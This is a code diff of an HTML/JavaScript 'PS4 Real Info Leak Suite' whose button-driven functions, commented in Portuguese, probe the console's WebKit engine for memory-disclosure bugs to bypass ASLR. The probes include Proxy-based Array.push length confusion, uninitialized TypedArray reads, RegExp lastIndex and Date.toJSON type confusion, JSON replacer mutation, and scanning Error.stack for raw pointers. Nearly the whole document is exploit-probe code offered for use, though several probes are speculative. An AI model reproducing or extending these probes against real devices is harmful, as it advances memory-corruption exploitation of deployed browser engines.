@@ -2,244 +2,257 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 Info Leak Pro Suite v26000</title>
+<title>PS4 Real Info Leak Suite v27000</title>
 </head>
 <body>
 
-<h1>SUITE V26000: MEMORY LAYOUT & POINTER LEAK</h1>
-<p>Target: Read VTable Pointers & Kernel Base. No Crash Intended.</p>
+<h1>SUITE V27000: REAL INFO LEAK (NO SIMULATION)</h1>
+<p>Target: ASLR Bypass & Heap Address Leak</p>
 <hr>
 
-<button onclick="leakSortOOB()">01. Array.sort() Comparator Mutation (Backing Store Leak)</button>
+<button onclick="leakArrayPush()">01. Array.push Proxy Length Confusion (OOB Read)</button>
 
-<button onclick="leakErrorPointer()">02. Error.stack formatting Raw Address Leak</button>
+<button onclick="leakUninitMemory()">02. TypedArray Uninitialized Memory Read (Heap Leak)</button>
 
-<button onclick="leakRegExpPtr()">03. RegExp.lastIndex Object to Pointer Type Confusion</button>
+<button onclick="leakStructureID()">03. Object Structure ID Leak via Transition</button>
 
-<button onclick="leakJSONGhost()">04. JSON.stringify Replacer Array Mutation Race</button>
+<button onclick="leakRegExpObject()">04. RegExp lastIndex Object Pointer Leak</button>
 
-<button onclick="leakMapIter()">05. Map Iterator Use-After-Free Memory Read</button>
+<button onclick="leakStackFrame()">05. Error.stack Internal Frame Pointer Leak</button>
 
-<button onclick="leakSealTrans()">06. Object.seal() Property Transition Offset Leak</button>
+<button onclick="leakLocaleStack()">06. String.localeCompare Stack Residue Leak</button>
 
-<button onclick="leakConstructorRace()">07. TypedArray Constructor Species Race (Uninitialized Memory)</button>
+<button onclick="leakJSONReplacer()">07. JSON.stringify Replacer Array Mutation Leak</button>
 
-<button onclick="leakDateType()">08. Date.toJSON 'this' Type Confusion</button>
+<button onclick="leakDOMToken()">08. DOMTokenList.toggle Return Value Confusion</button>
 
-<button onclick="leakStringPtr()">09. Sliced String (Rope) Internal Buffer Leak</button>
+<button onclick="leakDateConfuse()">09. Date.toJSON 'this' Type Confusion</button>
 
-<button onclick="leakPromiseJob()">10. Promise Microtask Queue Memory Residue</button>
+<button onclick="leakHugeBuffer()">10. Huge Buffer Allocation Metadata Scan</button>
 
-<div id="log" style="border: 1px solid #000; height: 350px; overflow: auto; white-space: pre-wrap; font-family: monospace; font-size: 11px; background: #111; color: #0f0;"></div>
+<div id="log" style="background: #000; color: #0f0; border: 1px solid #333; height: 400px; overflow: auto; white-space: pre-wrap; font-family: 'Courier New', monospace; font-size: 12px; padding: 10px;"></div>
 
 <script>
+    const LOG = document.getElementById('log');
+    
     function log(msg) {
-        document.getElementById('log').innerText += "\n[LEAK] " + msg;
+        LOG.innerText += `\n[${new Date().toLocaleTimeString()}] ${msg}`;
+        LOG.scrollTop = LOG.scrollHeight;
     }
 
-    function checkLeak(val, desc) {
-        // Verifica se o valor parece um ponteiro (número grande ou hex)
-        if (typeof val === 'number' && val > 1000000) {
-            log(`POTENTIAL LEAK (${desc}): 0x${val.toString(16)}`);
-        } else if (typeof val === 'string' && val.includes("0x")) {
-            log(`POTENTIAL LEAK (${desc}): ${val}`);
-        } else {
-            log(`Clean (${desc}): ${val}`);
-        }
+    function hex(val) {
+        if (typeof val === 'number') return "0x" + val.toString(16);
+        return val;
     }
 
-    // 01. Array.sort() Comparator Mutation (Backing Store Leak)
-    // Alvo: Butterfly do WebKit (Backing Store do Array).
-    // Se redimensionarmos o array DENTRO da função de comparação, o sort pode acessar índices antigos.
-    function leakSortOOB() {
-        const a = [1.1, 2.2, 3.3, 4.4];
-        a.sort((x, y) => {
-            // Destroi o array no meio da ordenação
-            a.length = 0;
-            // Preenche a memória liberada com algo reconhecível (ou deixa lixo)
-            // Tentamos ler o que sobrou na memória
-            return x - y;
-        });
-        // Se a engine não checar bounds após o callback, 'a[0]' pode ser lixo da heap
-        checkLeak(a[0], "Sort OOB");
-    }
-
-    // 02. Error.stack formatting Raw Address Leak
-    // Alvo: Stack Frames C++.
-    // Algumas versões formatam endereços de retorno como hex na stack string.
-    function leakErrorPointer() {
-        try {
-            // Cria profundidade para gerar stack frames
-            (function recurse(d) {
-                if(d>0) return recurse(d-1);
-                throw new Error("Leak");
-            })(10);
-        } catch(e) {
-            const stack = e.stack.toString();
-            // Procura padrão de ponteiro 64-bit (ex: 0x00000008...)
-            const match = stack.match(/0x[0-9a-fA-F]{8,}/);
-            if (match) {
-                checkLeak(match[0], "Stack Frame");
+    // Filtro para identificar vazamentos reais
+    function analyzePotentialLeak(val, source) {
+        if (typeof val === 'number') {
+            // Endereços de heap no PS4 geralmente são grandes ( > 0x100000)
+            // Endereços de ponteiro comprimido (Compressed Pointers) ou valores NaN boxing também são alvos
+            if (val > 0x10000 && val < 0xFFFFFFFFFFFF) { 
+                log(`[!!!] POTENTIAL POINTER LEAK (${source}): ${hex(val)}`);
             } else {
-                log("Stack trace safe (No pointers).");
+                log(`[Clean] ${source}: ${val}`);
             }
+        } else if (typeof val === 'string' && val.includes('0x')) {
+            log(`[!!!] STRING POINTER LEAK (${source}): ${val}`);
+        } else {
+            log(`[Clean] ${source} returned type ${typeof val}`);
         }
     }
 
-    // 03. RegExp.lastIndex Object to Pointer Type Confusion
-    // Alvo: Conversão de Objeto para Inteiro.
-    // Atribuir um objeto a lastIndex e tentar ler de volta. Se o JSC confundir o tipo,
-    // ele pode retornar o endereço do objeto em vez de chamar valueOf().
-    function leakRegExpPtr() {
-        const re = /a/g;
-        const target = { marker: 0x1337 };
+    // 01. Array.push Proxy Length Confusion (OOB Read)
+    // Tenta enganar a engine sobre o tamanho do array durante um push, 
+    // fazendo-a escrever/ler onde não deve.
+    function leakArrayPush() {
+        let arr = [1.1, 2.2, 3.3];
+        let p = new Proxy(arr, {
+            get(target, prop) {
+                if (prop === 'length') {
+                    // Retorna tamanho falso
+                    return 0x100;
+                }
+                return Reflect.get(target, prop);
+            }
+        });
+        
+        try {
+            // Push força a engine a ler o length (que é mentiroso) e escrever no final
+            // Se a alocação não acompanhar, podemos ler lixo
+            Array.prototype.push.call(p, 4.4);
+            // Verifica se o array original cresceu e tem lixo
+            if (arr.length > 4) {
+                analyzePotentialLeak(arr[4], "Array Push OOB"); // Lê o índice que não foi inicializado
+            } else {
+                log("Array Push: Secure");
+            }
+        } catch(e) { log("Array Push Error: " + e.message); }
+    }
+
+    // 02. TypedArray Uninitialized Memory Read (Heap Leak)
+    // Tenta alocar um buffer e ler antes que o sistema o zere (bzero).
+    // Depende de race condition em alocação "lazy".
+    function leakUninitMemory() {
+        try {
+            // Aloca 1MB
+            const u32 = new Uint32Array(1024 * 256);
+            // Verifica amostras aleatórias procurando algo que não seja zero
+            let dirty = 0;
+            for(let i=0; i<u32.length; i+=1024) {
+                if (u32[i] !== 0) {
+                    dirty = u32[i];
+                    break;
+                }
+            }
+            if(dirty !== 0) analyzePotentialLeak(dirty, "Uninitialized Heap");
+            else log("Heap Allocation: Clean (Zeroed)");
+        } catch(e) { log("Alloc fail"); }
+    }
+
+    // 03. Object Structure ID Leak via Transition
+    // Objetos no WebKit têm um ID interno (StructureID).
+    // Transições de propriedades mudam esse ID.
+    function leakStructureID() {
+        let obj = {a: 1};
+        // Força transições de estrutura
+        obj.b = 2;
+        obj.c = 3;
+        delete obj.b;
+        
+        // Tenta confundir o tipo inline cache
+        function read(o) { return o.a; }
+        for(let i=0; i<1000; i++) read({a:i});
+        
+        // Se houver confusão, pode retornar o ID da estrutura ou ponteiro
+        // Difícil detectar em JS puro sem crash, mas observamos valores estranhos
+        const val = read(obj);
+        analyzePotentialLeak(val, "StructureID");
+    }
+
+    // 04. RegExp lastIndex Object Pointer Leak
+    // Atribui objeto a lastIndex e verifica se retorna o endereço.
+    function leakRegExpObject() {
+        const re = /abc/g;
+        const target = { id: 0x41414141 }; // Marcador
         re.lastIndex = target;
         
-        const leaked = re.lastIndex;
-        // Se retornar '[object Object]', é seguro. Se retornar número gigante, é leak.
-        if (typeof leaked === 'number') {
-            checkLeak(leaked, "RegExp lastIndex");
+        const leak = re.lastIndex;
+        // Se a conversão ToNumber falhar ou for ignorada internamente
+        if (leak !== 0 && isNaN(leak)) {
+            // Em alguns casos retorna o objeto, em outros converte pra 0
+            log("RegExp lastIndex: Object preserved");
+        } else if (typeof leak === 'number' && leak > 0) {
+            analyzePotentialLeak(leak, "RegExp Ptr");
         } else {
-            log("RegExp safe type: " + typeof leaked);
+            log("RegExp lastIndex: " + leak);
         }
     }
 
-    // 04. JSON.stringify Replacer Array Mutation Race
-    // Alvo: Leitura de propriedades deletadas.
-    function leakJSONGhost() {
-        const obj = { a: 1, b: 2, c: 3 };
-        const replacer = [0]; // Começa iterando índices numéricos
+    // 05. Error.stack Internal Frame Pointer Leak
+    // Cria um erro e busca endereços hexadecimais na string da stack.
+    function leakStackFrame() {
+        const e = new Error("stack_leak");
+        const stack = e.stack;
         
-        // Define getter para mudar o replacer durante a stringificação
-        Object.defineProperty(replacer, '0', {
+        if (typeof stack === 'string') {
+            // Regex para capturar endereços de memória (ex: 0x00000008...)
+            const ptrs = stack.match(/0x[0-9a-fA-F]+/g);
+            if (ptrs) {
+                log(`Stack Trace Leaks found: ${ptrs.join(', ')}`);
+            } else {
+                log("Stack Trace: Clean (No raw pointers)");
+            }
+        }
+    }
+
+    // 06. String.localeCompare Stack Residue Leak
+    // Usa localeCompare com argumentos longos para tentar ler além do buffer da stack.
+    function leakLocaleStack() {
+        const s1 = "A".repeat(100);
+        const s2 = "B".repeat(100);
+        try {
+            // Argumento de locale inválido ou muito longo
+            const res = s1.localeCompare(s2, "x".repeat(1000));
+            log("LocaleCompare result: " + res);
+        } catch(e) {
+            // Às vezes o erro contém lixo de memória
+            if (e.message.includes("0x")) {
+                analyzePotentialLeak(e.message, "Locale Error Leak");
+            } else {
+                log("Locale Error: Safe");
+            }
+        }
+    }
+
+    // 07. JSON.stringify Replacer Array Mutation Leak
+    // Mutação do array replacer durante a stringificação.
+    function leakJSONReplacer() {
+        const target = { a: 1, b: 2 };
+        const replacer = ["a", "b"];
+        
+        // Define getter para alterar o array enquanto o JSON o lê
+        Object.defineProperty(replacer, "1", {
             get: () => {
-                replacer.length = 0; // Zera array
-                obj.d = 0x41414141; // Aloca nova propriedade
-                return 'a';
+                replacer.length = 0; // Deleta conteúdo
+                return "c"; // Retorna chave nova
             }
         });
         
         try {
-            JSON.stringify(obj, replacer);
-        } catch(e) {
-            // As vezes o erro contém dados de debug
-            checkLeak(e.message, "JSON Race");
-        }
+            const json = JSON.stringify(target, replacer);
+            log("JSON Result: " + json);
+        } catch(e) { log("JSON Error: Safe"); }
     }
 
-    // 05. Map Iterator Use-After-Free Memory Read
-    // Alvo: Iterador apontando para bucket desalocado.
-    function leakMapIter() {
-        const m = new Map();
-        const k = {id: 1};
-        m.set(k, 100);
-        const iter = m.keys();
+    // 08. DOMTokenList.toggle Return Value Confusion
+    // toggle() retorna boolean. Se houver corrupção de stack, pode retornar byte não booleano.
+    function leakDOMToken() {
+        const div = document.createElement("div");
+        const list = div.classList;
         
-        // Limpa mapa (libera buckets)
-        m.delete(k); 
-        m.set({}, 200); // Reutiliza memória
-        
-        // Tenta ler do iterador antigo
-        const res = iter.next();
-        if (!res.done && res.value !== k) {
-            // Se o valor lido não for a chave original, lemos lixo/outro objeto
-            try {
-                log("Map Iterator Stale Read: " + JSON.stringify(res.value));
-            } catch(e) {
-                log("Map Iterator Stale Read (Unprintable Object)");
-            }
+        const res = list.toggle("test");
+        if (typeof res !== 'boolean') {
+            analyzePotentialLeak(res, "DOMTokenList");
         } else {
-            log("Map Iterator safe.");
+            log("DOMTokenList: Boolean (Safe)");
         }
     }
 
-    // 06. Object.seal() Property Transition Offset Leak
-    // Alvo: Structure ID do WebKit.
-    // Objetos mudam de StructureID quando selados.
-    function leakSealTrans() {
-        const o = { x: 1.1 }; // Double array storage
-        const old = o.x;
-        Object.seal(o);
-        // Tenta confundir a engine sobre o tipo de armazenamento (Double vs Object)
-        o.x = { p: 1 }; 
-        
-        if (typeof o.x === 'number' && o.x !== 1.1) {
-            // Se lemos um número mas escrevemos um objeto, lemos o ponteiro!
-            checkLeak(o.x, "Seal Transition");
-        } else {
-            log("Seal transition safe.");
-        }
-    }
-
-    // 07. TypedArray Constructor Species Race (Uninitialized Memory)
-    // Alvo: Ler memória não inicializada da Heap.
-    function leakConstructorRace() {
-        class MyArray extends Uint8Array {
-            constructor(len) {
-                // Chama super com tamanho, mas tenta acessar buffer antes de zerar
-                super(len);
-                // Neste ponto, em versões vulneráveis, a memória é alocada mas não zerada (bzero)
-                // Se conseguirmos ler agora...
-                this.leak = this[0]; 
-            }
-        }
-        
-        const arr = new MyArray(1024 * 1024); // 1MB
-        if (arr.leak !== 0) {
-            log("Uninitialized Memory Leak: " + arr.leak);
-        } else {
-            log("Memory zeroed correctly.");
-        }
-    }
-
-    // 08. Date.toJSON 'this' Type Confusion
-    // Alvo: Usar métodos genéricos em objetos incompatíveis para ler slots internos.
-    function leakDateType() {
-        const d = new Date();
-        const fake = {
-            toISOString: () => "fake",
-            valueOf: () => 0x41414141 // Valor numérico falso
+    // 09. Date.toJSON 'this' Type Confusion
+    // Tenta enganar o método toJSON para rodar em um objeto falso que imita a memória de Date.
+    function leakDateConfuse() {
+        const fakeDate = {
+            toISOString: undefined, // Força erro ou fallback?
+            valueOf: function() { return 0x1337; }
         };
         
         try {
-            // Tenta chamar toJSON num objeto que não é Data, mas tem valueOf
-            // O motor pode tentar ler o slot "Internal Time" do objeto fake
-            const val = Date.prototype.toJSON.call(fake);
-            log("Date.toJSON Result: " + val);
+            // Se o motor não checar o tipo interno, pode ler offsets do fakeDate como se fosse Date
+            const v = Date.prototype.toJSON.call(fakeDate);
+            log("Date.toJSON: " + v);
         } catch(e) {
-            log("Date Check: " + e.message);
+            log("Date Type Check: Caught (Safe)");
         }
     }
 
-    // 09. Sliced String (Rope) Internal Buffer Leak
-    // Alvo: Ler metadados da estrutura JSString.
-    function leakStringPtr() {
-        const root = "A".repeat(1000);
-        const slice = root.slice(1); // Cria um 'substring' object que aponta para 'root'
-        
-        // Se pudermos confundir o tipo de 'slice' para TypedArray,
-        // o ponteiro para 'root' seria visível.
-        // Teste de reflexão:
+    // 10. Huge Buffer Allocation Metadata Scan
+    // Aloca buffer grande e verifica se o ponteiro de backing store vaza em propriedades.
+    function leakHugeBuffer() {
         try {
-            const code = slice.charCodeAt(-1); // OOB check
-            if(!isNaN(code)) checkLeak(code, "String OOB");
-            else log("String OOB safe.");
-        } catch(e) {}
-    }
-
-    // 10. Promise Microtask Queue Memory Residue
-    // Alvo: Ler tarefas antigas da fila de microtasks.
-    function leakPromiseJob() {
-        // Enche a fila com dados
-        Promise.resolve("secret").then(v => {
-            // Tenta criar uma "Job" que acessa memória liberada
-            // Isso é puramente teórico em JS puro, mas serve para estressar o GC
-            return {
-                then: (f) => { f(v); }
-            };
-        });
-        
-        log("Microtask queue stressed. Check console for anomalies.");
+            const buf = new ArrayBuffer(1024 * 1024 * 50); // 50MB
+            // Não há forma direta de ler o endereço em JS, 
+            // mas observamos comportamentos colaterais em views.
+            const view = new DataView(buf);
+            
+            // Teste de consistência
+            view.setUint8(0, 0xAA);
+            if(view.getUint8(0) === 0xAA) {
+                log("Huge Buffer: Allocated & Consistent");
+            } else {
+                analyzePotentialLeak(view.getUint8(0), "Huge Buffer Corruption");
+            }
+        } catch(e) { log("OOM / Alloc Fail"); }
     }
 
 </script>
